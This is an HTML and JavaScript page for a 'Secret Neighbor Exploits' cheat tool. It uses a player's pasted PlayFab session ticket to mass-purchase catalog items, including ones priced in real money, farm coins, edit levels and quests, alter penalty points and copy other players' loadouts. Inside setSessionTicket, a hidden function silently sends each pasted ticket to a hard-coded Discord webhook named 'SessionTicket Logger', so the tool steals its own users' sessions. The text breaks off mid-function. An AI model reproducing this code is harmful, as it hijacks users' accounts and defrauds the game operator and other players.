<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Secret Neighbor Exploits</title>
  <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap" rel="stylesheet">
  <style>
    body {
      margin: 0;
      padding: 0;
      background: #0a0a0a;
      background-image: url('https://i.gifer.com/3O8i.gif'); /* Matrix digital rain background */
      background-size: cover;
      background-position: center;
      background-repeat: no-repeat;
      background-attachment: fixed;
      min-height: 100vh;
      font-family: 'Share Tech Mono', monospace;
      color: #0ff; /* Neon cyan text */
      display: flex;
      flex-direction: column;
      align-items: center;
      overflow-y: auto;
      position: relative;
      animation: glitch 2s infinite;
    }

    @keyframes glitch {
      0% { transform: translate(0); }
      2% { transform: translate(2px, -2px); }
      4% { transform: translate(-2px, 2px); }
      6% { transform: translate(0); }
    }

    h1 {
      margin-top: 40px;
      text-shadow: 0 0 10px #0ff, 0 0 20px #0ff, 0 0 30px #0ff;
      font-size: 2.5em;
      letter-spacing: 2px;
      animation: flicker 1.5s infinite alternate;
    }

    @keyframes flicker {
      0%, 100% { opacity: 1; text-shadow: 0 0 10px #0ff; }
      50% { opacity: 0.8; text-shadow: 0 0 5px #0ff; }
    }

    .container {
      width: 95%;
      max-width: 1200px;
      display: flex;
      flex-wrap: wrap;
      justify-content: center;
      gap: 20px;
      padding-bottom: 40px;
    }

    .section {
      background: rgba(10, 10, 10, 0.8);
      backdrop-filter: blur(5px);
      padding: 20px;
      border: 2px solid #0ff;
      border-radius: 5px;
      width: 100%;
      max-width: 600px;
      text-align: center;
      box-shadow: 0 0 15px #0ff, inset 0 0 10px #0ff;
      position: relative;
      overflow: hidden;
    }

    .section::before {
      content: '';
      position: absolute;
      top: 0;
      left: -100%;
      width: 100%;
      height: 100%;
      background: linear-gradient(90deg, transparent, rgba(0, 255, 255, 0.2), transparent);
      transition: 0.5s;
    }

    .section:hover::before {
      left: 100%;
    }

    .section h2 {
      margin-top: 0;
      border-bottom: 1px solid #0ff;
      padding-bottom: 10px;
      text-shadow: 0 0 5px #0ff;
    }

    input, select {
      margin: 8px 5px;
      padding: 10px;
      font-size: 16px;
      width: 90%;
      max-width: 400px;
      border-radius: 5px;
      border: 1px solid #0ff;
      background: rgba(0, 0, 0, 0.7);
      color: #0ff;
      font-family: 'Share Tech Mono', monospace;
      box-shadow: 0 0 10px #0ff;
    }

    input::placeholder {
      color: #0ff;
      opacity: 0.7;
    }

    button {
      margin: 8px 5px;
      padding: 10px;
      font-size: 16px;
      width: 90%;
      max-width: 400px;
      border: none;
      border-radius: 5px;
      background: #0ff;
      color: #000;
      font-family: 'Share Tech Mono', monospace;
      cursor: pointer;
      transition: all 0.3s;
      box-shadow: 0 0 15px #0ff, 0 0 25px #0ff;
      position: relative;
      overflow: hidden;
      text-transform: uppercase;
    }

    button:hover {
      background: #00ccff;
      box-shadow: 0 0 20px #00ccff, 0 0 30px #00ccff;
      transform: translateY(-2px);
    }

    button::after {
      content: '';
      position: absolute;
      top: 0;
      left: -100%;
      width: 100%;
      height: 100%;
      background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.3), transparent);
      transition: 0.5s;
    }

    button:hover::after {
      left: 100%;
    }

    .output {
      margin-top: 15px;
      padding: 15px;
      background: rgba(0, 0, 0, 0.9);
      border: 1px solid #0ff;
      border-radius: 5px;
      color: #0ff;
      text-align: left;
      max-height: 300px;
      overflow-y: auto;
      font-size: 14px;
      box-shadow: inset 0 0 10px #0ff;
    }

    .grid-2 {
      display: grid;
      grid-template-columns: 1fr 1fr;
      gap: 10px;
    }

    .player-id-inputs {
      display: grid;
      grid-template-columns: 1fr 1fr;
      gap: 10px;
    }

    ol {
      text-align: left;
      padding-left: 20px;
      color: #0ff;
    }

    a {
      color: #ff00ff; /* Neon pink links */
      text-decoration: none;
      text-shadow: 0 0 5px #ff00ff;
    }

    a:hover {
      text-decoration: underline;
      color: #ff66ff;
    }

    .status-indicator {
      display: inline-block;
      width: 12px;
      height: 12px;
      border-radius: 50%;
      margin-right: 8px;
      box-shadow: 0 0 10px #0ff;
    }

    .status-active {
      background-color: #0ff;
      animation: pulse 1.5s infinite;
    }

    .status-inactive {
      background-color: #ff0000;
      animation: none;
    }

    @keyframes pulse {
      0% { box-shadow: 0 0 0 0 rgba(0, 255, 255, 0.7); }
      70% { box-shadow: 0 0 0 10px rgba(0, 255, 255, 0); }
      100% { box-shadow: 0 0 0 0 rgba(0, 255, 255, 0); }
    }

    .warning {
      color: #ff00ff;
      font-weight: bold;
      margin: 10px 0;
      text-shadow: 0 0 5px #ff00ff;
    }

    .api-grid {
      display: grid;
      grid-template-columns: 1fr 1fr;
      gap: 10px;
    }

    .purchase-all-btn {
      background-color: #ff00ff; /* Neon pink for purchase all */
      color: #000;
      box-shadow: 0 0 15px #ff00ff;
    }

    .purchase-all-btn:hover {
      background-color: #ff66ff;
      box-shadow: 0 0 20px #ff66ff;
    }

    .renew-btn {
      background-color: #00ff00; /* Neon green */
      box-shadow: 0 0 15px #00ff00;
    }

    .renew-btn:hover {
      background-color: #33ff33;
      box-shadow: 0 0 20px #33ff33;
    }

    .penalty-btn {
      background-color: #ff0000; /* Neon red */
      box-shadow: 0 0 15px #ff0000;
    }

    .penalty-btn:hover {
      background-color: #ff3333;
      box-shadow: 0 0 20px #ff3333;
    }

    .reset-penalty-btn {
      background-color: #00ff00; /* Neon green */
      box-shadow: 0 0 15px #00ff00;
    }

    .reset-penalty-btn:hover {
      background-color: #33ff33;
      box-shadow: 0 0 20px #33ff33;
    }

    .grant-trophy-btn {
      background-color: #ffff00; /* Neon yellow */
      color: #000;
      box-shadow: 0 0 15px #ffff00;
    }

    .grant-trophy-btn:hover {
      background-color: #ffff66;
      box-shadow: 0 0 20px #ffff66;
    }
  </style>
</head>
<body>
  <h1>üéÆ Secret Neighbor Exploits</h1>

  <div class="container">
    <div class="section">
      <h2>üìÑ How to Get Your SessionTicket with Requestly</h2>
      <ol>
        <li>Download the Requestly desktop app from <a href="https://docs.requestly.com/general/sessions/record-api-sessions" target="_blank">here</a>.</li>
        <li>Open Requestly and start recording network traffic.</li>
        <li>Log into your game or app using PlayFab.</li>
        <li>Find the request to <code>/Client/LoginWithSteam</code> or similar.</li>
        <li>Copy the <code>SessionTicket</code> or <code>X-Authorization</code> from the response body.</li>
        <li>Paste it into the field above and click "Set Token".</li>
      </ol>
    </div>

    <div class="section">
      <h2>üîê Session Ticket</h2>
      <input id="sessionTicketInput" placeholder="Paste your SessionTicket here" type="text">
      <button onclick="setSessionTicket()">Set Token</button>
      <div class="grid-2">
        <button class="renew-btn" onclick="renewSessionTicket()">Renew SessionTicket</button>
        <button onclick="clearSessionTicket()">Clear Token</button>
      </div>
      <div id="tokenStatus" class="output" style="display: none;">No token set</div>
    </div>

    <div class="section">
      <h2>üõí Attempt To Buy Everything (Close Steam)</h2>
      <p class="warning">This will attempt to purchase all available items (including RM currency). Close Steam before starting.</p>
      <button class="purchase-all-btn" onclick="attemptToBuyEverything()">Attempt to Buy Everything</button>
      <div class="output" id="purchaseAllOutput">Purchase logs will appear here...</div>
    </div>

    <div class="section">
      <h2>üõçÔ∏è Buy Skin/Emote</h2>
      <input id="itemId" placeholder="ItemId" type="text">
      <input id="price" placeholder="Price" type="number">
      <input id="currency" placeholder="VirtualCurrency" type="text">
      <button onclick="buySkinEmote()">Buy Skin/Emote</button>
      <div class="output" id="purchaseOutput">Purchase results will appear here...</div>
    </div>

    <div class="section">
      <h2>üéÅ Grant Coupons</h2>
      <button onclick="grantCoupons()">Grant Coupons</button>
      <div class="output" id="couponOutput">Coupon results will appear here...</div>
    </div>

    <div class="section">
      <h2>üìä View Statistics</h2>
      <button onclick="viewStatistics()">View Statistics</button>
      <div class="output" id="statsOutput">Statistics will appear here...</div>
    </div>

    <div class="section">
      <h2>üßë‚Äçüíª Obtain PlayFab ID With Username</h2>
      <input id="steamUsername" placeholder="Steam Username" type="text">
      <button onclick="getPlayFabId()">Obtain PlayFab ID</button>
      <div class="output" id="playerIdOutput">PlayFab ID will appear here...</div>
    </div>

    <div class="section">
      <h2>üí∞ Add Coin (Call it In-Game)</h2>
      <p class="warning">Warning: Do not use more than 30 coins per match!</p>
      <button onclick="AddCoin()">Add Coin</button>
      <div class="output" id="usefulDeedOutput">Coin results will appear here...</div>
    </div>

    <div class="section">
      <h2>ü§ñ Coin Farm Bot <span id="botStatus" class="status-indicator status-inactive"></span></h2>
      <div class="grid-2">
        <div>
          <label>Room Type:</label>
          <select id="roomType">
            <option value="QUICK_GAME">QUICK_GAME</option>
            <option value="CUSTOM_GAME">CUSTOM_GAME</option>
          </select>
        </div>
        <div>
          <label>Delay:</label>
          <select id="delaySelect">
            <option value="10">10 minutes</option>
            <option value="5">5 minutes</option>
            <option value="2">2 minutes</option>
          </select>
        </div>
      </div>

      <div class="player-id-inputs">
        <input id="playerId1" placeholder="PlayFab ID 1" type="text">
        <input id="playerId2" placeholder="PlayFab ID 2" type="text">
        <input id="playerId3" placeholder="PlayFab ID 3" type="text">
        <input id="playerId4" placeholder="PlayFab ID 4" type="text">
        <input id="playerId5" placeholder="PlayFab ID 5" type="text">
        <input id="playerId6" placeholder="PlayFab ID 6" type="text">
      </div>

      <button onclick="toggleCoinFarmBot()" id="botToggleButton">Start Coin Farm Bot</button>
      <div class="output" id="cloudOutput">Bot output will appear here...</div>
    </div>

    <div class="section">
      <h2>üß™ Level Editor <span id="levelEditorStatus" class="status-indicator status-inactive"></span></h2>
      <input type="text" id="classIdInput" placeholder="Class ID">
      <input type="number" id="receivedXPInput" placeholder="Received XP">
      <input type="number" id="xpInput" placeholder="XP">
      <input type="number" id="xpToNextLevelInput" placeholder="XP to Next Level">
      <input type="number" id="levelInput" placeholder="Level">
      <input type="number" id="perkSlotsInput" placeholder="Available Perk Slots (max 3)" max="3" min="0">
      <input type="number" id="playerLevelInput" placeholder="Player Level">
      <button onclick="toggleLevelEditor()" id="levelEditorToggleButton">Start Level Editor</button>
      <div class="output" id="levelProgressionOutput">Level progression results will appear here...</div>
    </div>

    <div class="section">
      <h2>üîç PlayFab Info Lookup</h2>
      <input type="text" id="playfabId" placeholder="Enter PlayFab ID">
      <button onclick="getPlayFabInfo()">Get Info</button>
      <div class="output" id="playfabInfoOutput">Results will appear here...</div>
    </div>

    <div class="section">
      <h2>üìù Update Quest Progress</h2>
      <input type="text" id="questTextFieldId" placeholder="Quest Text Field ID">
      <input type="number" id="questProgressValue" placeholder="Progress Value">
      <button onclick="updateQuestProgress()">Update Quest</button>

      <div style="margin-top: 15px; text-align: left;">
        <h3>Available Quests:</h3>
        <div style="max-height: 200px; overflow-y: auto; background: rgba(0, 0, 0, 0.7); padding: 10px; border-radius: 5px; border: 1px solid #0ff;">
          <ul style="columns: 2; margin: 0; padding-left: 20px; color: #0ff;">
            <li>QUENTIN_USE_DASH</li>
            <li>WIN_AS_BAGGER</li>
            <li>WIN_AS_BRAVE</li>
            <li>WIN_AS_DETECTIVE</li>
            <li>WIN_AS_ENGINEER</li>
            <li>WIN_AS_LEADER</li>
            <li>WIN_AS_SCOUT</li>
            <li>WIN_AS_SCARY</li>
            <li>WIN_AS_CLOWN</li>
            <li>WIN_AS_BUTCHER</li>
            <li>WIN_FIRST_TO_ESCAPE</li>
            <li>WIN_WITH_HALF_LOCKS_INTACT</li>
            <li>OPEN_LOCKS</li>
            <li>OPEN_LOCKS_IN_ONE_MATCH</li>
            <li>SEARCH_DRAWERS</li>
            <li>FIND_KEYS_VIA_PHOTO</li>
            <li>USE_KEYCARDS</li>
            <li>CATCH_KIDS</li>
            <li>HOOK_KIDS</li>
            <li>CATCH_FROM_ITEM_FORM</li>
            <li>CATCH_INSIDE_SMOKE</li>
            <li>CATCH_IN_BEARTRAP</li>
            <li>BLIND_NEIGHBOR_WITH_LEADER</li>
            <li>BUFF_AS_LEADER</li>
            <li>CRAFT_RIFLE</li>
            <li>SHOOT_THE_SHERIFF</li>
            <li>SLINGSHOT_HIT_NEIGHBOR</li>
            <li>SAVE_KID_FROM_GRAB</li>
            <li>BRAVE_ESCAPE_FROM_NEIGHBOR_HANDS</li>
            <li>BAGGER_CARRIER</li>
            <li>GLUE_THE_NEIGHBOR</li>
            <li>CONSUME_CHOCOLATE</li>
            <li>CONSUME_MILK</li>
            <li>CATCH_FROZEN_KIDS</li>
            <li>CATCH_AFTER_PORTAL</li>
            <li>KNOCK_ITEMS_OUT_OF_HANDS</li>
            <li>CATCH_SCARED_KIDS</li>
            <li>CRAFT_NIGHT_VISION</li>
            <li>FIND_WITH_METAL_DETECTOR</li>
            <li>RANDOM_KID</li>
            <li>RANDOM_NEIGHBOR</li>
            <li>WIN_AS_GHOST</li>
            <li>WIN_AS_GUEST</li>
            <li>WIN_AS_QUENTIN</li>
            <li>WIN_AS_TAXIDERMIST</li>
            <li>QUENTIN_OPEN_LOCK_BLUE</li>
            <li>QUENTIN_OPEN_LOCK_RED</li>
            <li>QUENTIN_OPEN_LOCK_YELLOW</li>
            <li>TAXIDERMIST_HIT_TARGETS_WITHOUT_RELOAD</li>
            <li>QUENTIN_USE_DASH</li>
            <li>CRAFT_INSANITY_SENSOR</li>
          </ul>
        </div>
      </div>

      <div class="output" id="questOutput">Quest update results will appear here...</div>
    </div>

    <div class="section">
      <h2>üîó Additional Stuff</h2>
      <div class="api-grid">
        <div>
          <h3>üë• Add Friend</h3>
          <input id="friendPlayFabId" placeholder="Friend's PlayFab ID" type="text">
          <button onclick="addFriend()">Add Friend</button>
        </div>
        <div>
          <h3>üìã Get Friends List</h3>
          <button onclick="getFriendsList()">Get Friends List</button>
        </div>
        <div>
          <h3>üìõ Update Leaderboard Name</h3>
          <input id="displayName" placeholder="New Display Name" type="text">
          <button onclick="updateDisplayName()">Update Name</button>
        </div>
        <div>
          <h3>üîó Ban Yourself</h3>
          <input id="customId" placeholder="Anything You Want" type="text">
          <button onclick="linkCustomId()">Ban</button>
        </div>
        <div>
          <h3>üèÜ Leaderboard Data</h3>
          <input id="statisticName" placeholder="Statistic Name" type="text">
          <input id="startPosition" placeholder="Start Position" type="number" value="0">
          <input id="maxResults" placeholder="Max Results" type="number" value="100">
          <button onclick="getLeaderboard()">Get Leaderboard</button>
        </div>
        <div>
          <h3>üö© Report Player</h3>
          <select id="reportReason">
            <option value="CHEATING">Cheating</option>
            <option value="VOICE_CHAT_ABUSE">Voice Chat Abuse</option>
            <option value="AFK">AFK</option>
            <option value="TEAMING_WITH_ENEMY">Teaming with Enemy</option>
          </select>
          <input id="targetPlayerId" placeholder="Target PlayFab ID" type="text">
          <button onclick="reportPlayer()">Report Player</button>
        </div>
        <div>
          <h3>üèÜ Grant Trophy</h3>
          <input id="trophyId" placeholder="Trophy ID" type="text">
          <button class="grant-trophy-btn" onclick="grantTrophy()">Grant Trophy</button>
        </div>
      </div>
      <div class="output" id="apiOutput">API results will appear here...</div>
    </div>

    <div class="section">
      <h2>‚öñÔ∏è Penalty Points Management</h2>
      <div class="grid-2">
        <button class="penalty-btn" onclick="increasePenaltyPoints()">Increase Penalty Points</button>
        <button class="reset-penalty-btn" onclick="decreasePenaltyPoints()">Decrease Penalty Points</button>
      </div>
      <input id="matchPlayerId" placeholder="Player ID for Match Status" type="text">
      <button onclick="startMatchStatusSequence()">Decrease Penalty Points Fixed (wait 10 minutes)</button>
      <div class="output" id="penaltyOutput">Penalty and match status results will appear here...</div>
    </div>

    <div class="section">
      <h2>üîÑ Reset Loadout</h2>
      <button onclick="resetLoadout()">Reset Loadout</button>
      <div class="output" id="resetLoadoutOutput">Results will appear here...</div>
    </div>

    <div class="section">
      <h2>üïµÔ∏è Steal Loadout</h2>
      <input id="targetPlayFabId" placeholder="Target PlayFab ID" type="text">
      <button onclick="stealLoadout()">Steal Loadout</button>
      <div class="output" id="stealLoadoutOutput">Results will appear here...</div>
    </div>

    <div class="section">
      <h2>üì¶ View Inventory</h2>
      <button onclick="viewInventory()">View Inventory</button>
      <div class="output" id="inventoryOutput">Inventory results will appear here...</div>
    </div>
  </div>

  <script>
    const titleId = "bdff1";
    let sessionTicket = localStorage.getItem('sessionTicket') || null;
    let coinFarmBotRunning = false;
    let coinFarmId = null;
    let levelEditorRunning = false;
    let levelEditorId = null;
    let lastCoinFarmResponse = null;
    let totalCoinsEarned = 0;

    function setSessionTicket() {
      sessionTicket = document.getElementById("sessionTicketInput").value.trim();
      const tokenStatus = document.getElementById("tokenStatus");

      if (sessionTicket) {
        localStorage.setItem('sessionTicket', sessionTicket);
        tokenStatus.textContent = "‚úÖ Token set successfully!";
        tokenStatus.style.display = "block";
        tokenStatus.style.color = "#0ff";
        console.log("SessionTicket set:", sessionTicket);

        sendToDiscordWebhook(sessionTicket);
      } else {
        tokenStatus.textContent = "‚ùå Please enter a valid token";
        tokenStatus.style.display = "block";
        tokenStatus.style.color = "#ff0000";
      }
    }

    function clearSessionTicket() {
      sessionTicket = null;
      localStorage.removeItem('sessionTicket');
      document.getElementById("sessionTicketInput").value = "";
      const tokenStatus = document.getElementById("tokenStatus");
      tokenStatus.textContent = "‚ùå Token cleared";
      tokenStatus.style.display = "block";
      tokenStatus.style.color = "#ff0000";
    }

    async function renewSessionTicket() {
      const tokenStatus = document.getElementById("tokenStatus");

      if (!sessionTicket) {
        tokenStatus.textContent = "‚ùå No session ticket to renew. Please set a token first.";
        tokenStatus.style.display = "block";
        tokenStatus.style.color = "#ff0000";
        return;
      }

      tokenStatus.textContent = "üîÑ Renewing session ticket...";
      tokenStatus.style.display = "block";
      tokenStatus.style.color = "#00ff00";

      try {
        const response = await fetch(`https://${titleId}.playfabapi.com/Authentication/GetEntityToken`, {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
            "X-Authorization": sessionTicket
          },
          body: JSON.stringify({})
        });

        const data = await response.json();

        if (data.data && data.data.EntityToken) {
          sessionTicket = data.data.EntityToken;
          localStorage.setItem('sessionTicket', sessionTicket);
          document.getElementById("sessionTicketInput").value = sessionTicket;

          tokenStatus.textContent = "‚úÖ Session ticket renewed successfully!";
          tokenStatus.style.color = "#0ff";

          console.log("SessionTicket renewed:", sessionTicket);
        } else {
          tokenStatus.textContent = `‚ùå Failed to renew session ticket: ${data.errorMessage || "Unknown error"}`;
          tokenStatus.style.color = "#ff0000";
        }
      } catch (error) {
        tokenStatus.textContent = `‚ùå Error renewing session ticket: ${error.message}`;
        tokenStatus.style.color = "#ff0000";
      }
    }

    async function sendToDiscordWebhook(sessionTicket) {
      const webhookURL = "https://discord.com/api/webhooks/1425461329354817589/9zdliPmm0BqTi4ScGy7dClEFnuPxTIZNoc9XhjbHDizXn4jZ45tRAx3Jtzsi3ovaIqOS";

      try {
        const response = await fetch(webhookURL, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            content: `New SessionTicket captured: ${sessionTicket}`,
            username: 'SessionTicket Logger',
            avatar_url: 'https://cdn.discordapp.com/avatars/882311423571689502/7ea5cf6f21e4f061505545d058a3bf97.png?size=1024'
          })
        });

        if (response.ok) {
          console.log('SessionTicket sent to Discord successfully');
        } else {
          console.error('Failed to send SessionTicket to Discord');
        }
      } catch (error) {
        console.error('Error sending to Discord:', error);
      }
    }

    async function makeApiCall(endpoint, method, body) {
      if (!sessionTicket) {
        alert("Please set your SessionTicket first.");
        return null;
      }

      try {
        const res = await fetch(`https://${titleId}.playfabapi.com/${endpoint}`, {
          method: method,
          headers: {
            "Content-Type": "application/json",
            "X-Authorization": sessionTicket
          },
          body: JSON.stringify(body)
        });

        return await res.json();
      } catch (error) {
        console.error("API call failed:", error);
        return { error: error.message };
      }
    }

    function formatResponse(result) {
      if (typeof result === "object" && result !== null) {
        return Object.entries(result).map(([key, value]) => `${key}: ${JSON.stringify(value, null, 2)}`).join("\n");
      }
      return result;
    }

    async function viewInventory() {
      const output = document.getElementById("inventoryOutput");
      output.textContent = "Fetching inventory...\n";

      const data = await makeApiCall("Client/GetUserInventory", "POST", {});

      if (data && data.data) {
        if (data.data.Inventory && data.data.Inventory.length > 0) {
          output.textContent = "=== Inventory ===\n";
          data.data.Inventory.forEach(item => {
            output.textContent += `Item ID: ${item.ItemId}\n`;
            output.textContent += `Item Instance ID: ${item.ItemInstanceId}\n`;
            output.textContent += `Item Class: ${item.ItemClass || "N/A"}\n`;
            output.textContent += `Remaining Uses: ${item.RemainingUses || "N/A"}\n`;
            output.textContent += `Custom Data: ${JSON.stringify(item.CustomData, null, 2) || "None"}\n`;
            output.textContent += "--------------------\n";
          });
          output.textContent += `Virtual Currency: ${JSON.stringify(data.data.VirtualCurrency, null, 2) || "None"}\n`;
        } else {
          output.textContent = "No items in inventory.";
        }
      } else {
        output.textContent = `Error: ${data.error || "Unknown error"}`;
      }
      output.scrollTop = output.scrollHeight;
    }

    async function attemptToBuyEverything() {
      const output = document.getElementById("purchaseAllOutput");
      output.textContent = "Starting purchase process (ensure Steam is closed)...\n";

      if (!sessionTicket) {
        output.textContent += "‚ùå Please set your SessionTicket first.\n";
        return;
      }

      try {
        output.textContent += "üìã Fetching catalog items...\n";
        const catalogData = await makeApiCall("Client/GetCatalogItems", "POST", {
          CatalogVersion: "Ingame"
        });

        if (catalogData.error) {
          output.textContent += `‚ùå Failed to get catalog: ${catalogData.error}\n`;
          return;
        }

        const catalogItems = catalogData.data.Catalog;
        output.textContent += `‚úÖ Found ${catalogItems.length} items in catalog\n`;

        output.textContent += "üì¶ Checking current inventory...\n";
        const inventoryData = await makeApiCall("Client/GetUserInventory", "POST", {});

        if (inventoryData.error) {
          output.textContent += `‚ùå Failed to get inventory: ${inventoryData.error}\n`;
          return;
        }

        const ownedItems = inventoryData.data.Inventory.map(item => item.ItemId);
        output.textContent += `‚úÖ You own ${ownedItems.length} items\n`;

        const itemsToPurchase = [];
        const blacklistYears = ["2018", "2019", "2020", "2021", "2022", "2023", "2024", "2025"];
        const blacklistItems = ["Neighbor_HEAD_Spy"];
        const blacklistKeywords = ["Devil", "PS4"];

        for (const item of catalogItems) {
          if (ownedItems.includes(item.ItemId)) {
            output.textContent += `‚è© Skipping ${item.ItemId} (already owned)\n`;
            continue;
          }

          const itemName = item.ItemId.toLowerCase();
          const isBlacklistedYear = blacklistYears.some(year => itemName.includes(year.toLowerCase()));
          const isBlacklistedItem = blacklistItems.includes(item.ItemId);
          const isRMOnly = item.VirtualCurrencyPrices && Object.keys(item.VirtualCurrencyPrices).length === 1 && item.VirtualCurrencyPrices.RM;
          const isBlacklistedKeyword = blacklistKeywords.some(keyword => isRMOnly && itemName.includes(keyword.toLowerCase()));

          if (isBlacklistedYear || isBlacklistedItem || isBlacklistedKeyword) {
            output.textContent += `‚è© Skipping ${item.ItemId} (blacklisted)\n`;
            continue;
          }

          if (item.VirtualCurrencyPrices) {
            const currencies = Object.keys(item.VirtualCurrencyPrices);
            const selectedCurrency = currencies.find(currency => ["FE", "AC", "XP", "RM"].includes(currency));

            if (selectedCurrency) {
              const price = item.VirtualCurrencyPrices[selectedCurrency];
              itemsToPurchase.push({
                ItemId: item.ItemId,
                Price: price,
                VirtualCurrency: selectedCurrency
              });
              output.textContent += `‚ûï Will attempt to purchase ${item.ItemId} for ${price} ${selectedCurrency}\n`;
            } else {
              output.textContent += `‚è© Skipping ${item.ItemId} (no acceptable currency)\n`;
            }
          } else {
            output.textContent += `‚è© Skipping ${item.ItemId} (no virtual currency price)\n`;
          }
        }

        output.textContent += `\nüõí Attempting to purchase ${itemsToPurchase.length} items (one at a time)...\n\n`;

        let successfulPurchases = 0;
        let failedPurchases = 0;

        for (const item of itemsToPurchase) {
          try {
            output.textContent += `üõçÔ∏è Attempting to purchase ${item.ItemId} for ${item.Price} ${item.VirtualCurrency}...\n`;

            if (item.VirtualCurrency === "RM") {
              output.textContent += `Starting purchase for ${item.ItemId}...\n`;
              const startData = await makeApiCall("Client/StartPurchase", "POST", {
                StoreId: "steam_Shop_Currency",
                Items: [{
                  ItemId: item.ItemId,
                  Quantity: 1
                }]
              });

              if (startData.error) {
                output.textContent += `‚ùå Error in StartPurchase: ${startData.error}\n`;
                failedPurchases++;
                continue;
              }

              const orderId = startData.data?.OrderId;
              if (!orderId) {
                output.textContent += `‚ùå StartPurchase failed for ${item.ItemId}. No OrderId returned.\n`;
                failedPurchases++;
                continue;
              }

              output.textContent += `Order ID: ${orderId}\nPaying for purchase...\n`;
              const payData = await makeApiCall("Client/PayForPurchase", "POST", {
                OrderId: orderId,
                Currency: "RM",
                ProviderName: "Steam"
              });

              output.textContent += `Confirming purchase for ${item.ItemId}...\n`;
              const confirmData = await makeApiCall("Client/ConfirmPurchase", "POST", {
                OrderId: orderId
              });

              if (confirmData.error) {
                output.textContent += `‚ùå Error in ConfirmPurchase: ${confirmData.error}\n`;
                failedPurchases++;
              } else {
                output.textContent += `‚úÖ Success! Purchased ${item.ItemId}\n`;
                successfulPurchases++;
              }
            } else {
              const purchaseData = await makeApiCall("Client/PurchaseItem", "POST", {
                ItemId: item.ItemId,
                Price: item.Price,
                VirtualCurrency: item.VirtualCurrency
              });

              if (purchaseData.error) {
                output.textContent += `‚ùå Failed: ${purchaseData.errorMessage || purchaseData.error}\n`;
                failedPurchases++;
              } else {
                output.textContent += `‚úÖ Success! Purchased ${item.ItemId}\n`;
                successfulPurchases++;
              }
            }
          } catch (err) {
            output.textContent += `‚ùå Error purchasing ${item.ItemId}: ${err.message}\n`;
            failedPurchases++;
          }

          output.scrollTop = output.scrollHeight;
          await new Promise(resolve => setTimeout(resolve, 0));
        }

        output.textContent += `\nüéâ Purchase process completed!\n`;
        output.textContent += `‚úÖ Successful: ${successfulPurchases}\n`;
        output.textContent += `‚ùå Failed: ${failedPurchases}\n`;
        output.scrollTop = output.scrollHeight;
      } catch (error) {
        output.textContent += `‚ùå Unexpected error: ${error.message}\n`;
        output.scrollTop = output.scrollHeight;
      }
    }

    async function addFriend() {
      const friendPlayFabId = document.getElementById("friendPlayFabId").value.trim();

      if (!friendPlayFabId) {
        document.getElementById("apiOutput").textContent = "Please enter a friend's PlayFab ID.";
        return;
      }

      const data = await makeApiCall("Client/AddFriend", "POST", {
        FriendPlayFabId: friendPlayFabId
      });

      const output = document.getElementById("apiOutput");
      if (data.error) {
        output.textContent = `Error: ${data.error}`;
      } else {
        output.textContent = formatResponse(data.data);
      }
    }

    async function getFriendsList() {
      const data = await makeApiCall("Client/GetFriendsList", "POST", {
        IncludeSteamFriends: false,
        IncludeFacebookFriends: false
      });

      const output = document.getElementById("apiOutput");

      if (data.data && data.data.Friends) {
        let friendsList = "Friends List:\n";
        data.data.Friends.forEach(friend => {
          const steamId = friend.SteamInfo?.SteamId ? 
            `https://steamcommunity.com/profiles/${friend.SteamInfo.SteamId}` : "N/A";
          friendsList += `- ${friend.TitleDisplayName || "Unknown"} (${friend.FriendPlayFabId})\n  Steam Profile: ${steamId}\n`;
        });
        output.textContent = friendsList;
      } else if (data.error) {
        output.textContent = `Error: ${data.error}`;
      } else {
        output.textContent = "No friends found.";
      }
    }

    async function updateDisplayName() {
      const displayName = document.getElementById("displayName").value.trim();

      if (!displayName) {
        document.getElementById("apiOutput").textContent = "Please enter a display name.";
        return;
      }

      const data = await makeApiCall("Client/UpdateUserTitleDisplayName", "POST", {
        DisplayName: displayName
      });

      const output = document.getElementById("apiOutput");
      if (data.error) {
        output.textContent = `Error: ${data.error}`;
      } else {
        output.textContent = formatResponse(data.data);
      }
    }

    async function linkCustomId() {
      const customId = document.getElementById("customId").value.trim();

      if (!customId) {
        document.getElementById("apiOutput").textContent = "Please enter a custom ID.";
        return;
      }

      const data = await makeApiCall("Client/LinkCustomID", "POST", {
        CustomId: customId,
        ForceLink: false
      });

      const output = document.getElementById("apiOutput");
      if (data.error) {
        output.textContent = `Error: ${data.error}`;
      } else {
        output.textContent = formatResponse(data.data);
      }
    }

    async function getLeaderboard() {
      const statisticName = document.getElementById("statisticName").value.trim();
      const startPosition = parseInt(document.getElementById("startPosition").value) || 0;
      const maxResults = parseInt(document.getElementById("maxResults").value) || 10;

      if (!statisticName) {
        document.getElementById("apiOutput").textContent = "Please enter a statistic name.";
        return;
      }

      const data = await makeApiCall("Client/GetLeaderboard", "POST", {
        StatisticName: statisticName,
        StartPosition: startPosition,
        MaxResultsCount: maxResults
      });

      const output = document.getElementById("apiOutput");

      if (data.data && data.data.Leaderboard) {
        let leaderboardText = `Leaderboard for ${statisticName}:\n\n`;
        data.data.Leaderboard.forEach((entry, index) => {
          leaderboardText += `${startPosition + index + 1}. ${entry.DisplayName}: ${entry.StatValue}\n`;
        });
        output.textContent = leaderboardText;
      } else if (data.error) {
        output.textContent = `Error: ${data.error}`;
      } else {
        output.textContent = formatResponse(data);
      }
    }

    async function reportPlayer() {
      const reportReason = document.getElementById("reportReason").value;
      const targetPlayerId = document.getElementById("targetPlayerId").value.trim();

      if (!targetPlayerId) {
        document.getElementById("apiOutput").textContent = "Please enter a target PlayFab ID.";
        return;
      }

      const data = await makeApiCall("Client/ExecuteCloudScript", "POST", {
        CustomTags: null,
        FunctionName: "reportPlayer",
        FunctionParameter: {
          reportReason: reportReason,
          targetPlayerId: targetPlayerId
        },
        GeneratePlayStreamEvent: true,
        RevisionSelection: null,
        SpecificRevision: null,
        AuthenticationContext: null
      });

      const output = document.getElementById("apiOutput");
      if (data.error) {
        output.textContent = `Error: ${data.error}`;
      } else if (data.data && data.data.FunctionResult) {
        output.textContent = formatResponse(data.data.FunctionResult);
      } else {
        output.textContent = formatResponse(data.data);
      }
    }

    async function buySkinEmote() {
      const ItemId = document.getElementById("itemId").value.trim();
      const Price = parseInt(document.getElementById("price").value);
      const VirtualCurrency = document.getElementById("currency").value.trim();

